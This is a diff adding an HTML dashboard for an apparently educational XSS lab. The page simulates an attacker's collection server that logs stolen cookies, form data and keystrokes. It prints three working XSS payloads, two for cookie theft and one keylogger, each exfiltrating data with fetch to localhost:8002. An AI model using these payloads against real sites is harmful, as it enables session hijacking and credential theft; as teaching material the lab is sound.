@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Attacker Site - Data Collection</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            margin: 40px;
+            background: #1a1a1a;
+            color: #00ff00;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        h1 {
+            color: #ff6b6b;
+            text-align: center;
+            border-bottom: 2px solid #333;
+            padding-bottom: 10px;
+        }
+        .section {
+            background: #2a2a2a;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 8px;
+            border: 1px solid #444;
+        }
+        .log-container {
+            background: #000;
+            color: #00ff00;
+            padding: 15px;
+            border-radius: 6px;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            max-height: 500px;
+            overflow-y: auto;
+            border: 1px solid #333;
+        }
+        button {
+            background: #333;
+            color: #00ff00;
+            padding: 10px 20px;
+            border: 1px solid #555;
+            border-radius: 4px;
+            cursor: pointer;
+            margin: 5px;
+            font-family: 'Courier New', monospace;
+        }
+        button:hover {
+            background: #444;
+        }
+        button.danger {
+            color: #ff6b6b;
+        }
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin: 20px 0;
+        }
+        .stat-item {
+            background: #333;
+            padding: 15px;
+            border-radius: 6px;
+            text-align: center;
+            border: 1px solid #555;
+        }
+        .stat-value {
+            font-size: 24px;
+            color: #ff6b6b;
+            font-weight: bold;
+        }
+        .payload-example {
+            background: #2a2a2a;
+            border: 1px solid #444;
+            border-radius: 4px;
+            padding: 10px;
+            margin: 10px 0;
+            font-size: 11px;
+            overflow-x: auto;
+            color: #ffeb3b;
+        }
+        .warning {
+            background: #4a1a1a;
+            color: #ffcccc;
+            padding: 15px;
+            border-radius: 6px;
+            border: 1px solid #ff6b6b;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>XSS Attacker Site - Data Collection Terminal</h1>
+        
+        <div class="warning">
+            <strong>EDUCATIONAL DEMONSTRATION ONLY</strong><br>
+            This site simulates an attacker's data collection server for XSS attack demonstration
+        </div>
+
+        <div class="section">
+            <h3>Attack Statistics</h3>
+            <div class="stats">
+                <div class="stat-item">
+                    <div class="stat-value" id="victim-count">0</div>
+                    <div>Victims</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value" id="cookie-count">0</div>
+                    <div>Cookie Thefts</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value" id="form-count">0</div>
+                    <div>Form Data</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value" id="keystroke-count">0</div>
+                    <div>Keystrokes</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="section">
+            <h3>Stolen Data Log</h3>
+            <button onclick="refreshLogs()">Refresh</button>
+            <button onclick="clearLogs()" class="danger">Clear Logs</button>
+            
+            <div id="stolen-data-log" class="log-container">
+                <div>[SYSTEM] XSS Data Collection Server Online</div>
+                <div>[SYSTEM] Waiting for attack payloads to execute...</div>
+            </div>
+        </div>
+
+        <div class="section">
+            <h3>Example XSS Payloads</h3>
+            <p>These payloads send stolen data to this server when executed on vulnerable sites:</p>
+            
+            <div><strong>Cookie Theft (Script Tag):</strong></div>
+            <div class="payload-example">&lt;script&gt;fetch('https://localhost:8002/steal?cookies='+document.cookie)&lt;/script&gt;</div>
+            
+            <div><strong>Cookie Theft (Image Tag - DOM XSS):</strong></div>
+            <div class="payload-example">&lt;img src=x onerror="fetch('https://localhost:8002/steal?cookies='+document.cookie)"&gt;</div>
+            
+            <div><strong>Keylogger:</strong></div>
+            <div class="payload-example">&lt;script&gt;document.onkeypress=function(e){fetch('https://localhost:8002/keylog?key='+String.fromCharCode(e.which))}&lt;/script&gt;</div>
+        </div>
+    </div>
+
+    <script>
+        let victimCount = 0;
+        let cookieCount = 0;
+        let formCount = 0;
+        let keystrokeCount = 0;
+
+        function updateStats() {
+            document.getElementById('victim-count').textContent = victimCount;
+            document.getElementById('cookie-count').textContent = cookieCount;
+            document.getElementById('form-count').textContent = formCount;
+            document.getElementById('keystroke-count').textContent = keystrokeCount;
+        }
+
+        async function refreshLogs() {
+            try {
+                const response = await fetch('/api/stolen-data');
+                const data = await response.json();
+                
+                const logContainer = document.getElementById('stolen-data-log');
+                logContainer.innerHTML = '<div>[SYSTEM] XSS Data Collection Server Online</div>';
+                
+                if (data.logs && data.logs.length > 0) {
+                    data.logs.forEach(log => {
+                        const logLine = document.createElement('div');
+                        logLine.textContent = log;
+                        logContainer.appendChild(logLine);
+                        
+                        // Update stats
+                        if (log.includes('COOKIES')) cookieCount++;
+                        if (log.includes('FORM_DATA')) formCount++;
+                        if (log.includes('KEYSTROKES')) keystrokeCount++;
+                    });
+                    
+                    // Count unique IPs as victims
+                    const uniqueIPs = new Set();
+                    data.logs.forEach(log => {
+                        const ipMatch = log.match(/from ([\d\.:]+):/);
+                        if (ipMatch) uniqueIPs.add(ipMatch[1]);
+                    });
+                    victimCount = uniqueIPs.size;
+                    
+                } else {
+                    logContainer.innerHTML += '<div>[SYSTEM] No stolen data received yet</div>';
+                }
+                
+                updateStats();
+                logContainer.scrollTop = logContainer.scrollHeight;
+                
+            } catch (error) {
+                console.error('Failed to fetch logs:', error);
+                document.getElementById('stolen-data-log').innerHTML += 
+                    '<div style="color: #ff6b6b;">[ERROR] Could not fetch logs</div>';
+            }
+        }
+
+        async function clearLogs() {
+            try {
+                await fetch('/api/clear-logs', { method: 'POST' });
+                document.getElementById('stolen-data-log').innerHTML = 
+                    '<div>[SYSTEM] XSS Data Collection Server Online</div><div>[SYSTEM] Logs cleared</div>';
+                
+                // Reset stats
+                victimCount = 0;
+                cookieCount = 0;
+                formCount = 0;
+                keystrokeCount = 0;
+                updateStats();
+                
+            } catch (error) {
+                console.error('Failed to clear logs:', error);
+            }
+        }
+
+        // Auto-refresh logs every 500 milliseconds
+        setInterval(refreshLogs, 500);
+
+        // Initialize
+        window.onload = function() {
+            refreshLogs();
+        };
+    </script>
+</body>
+</html>
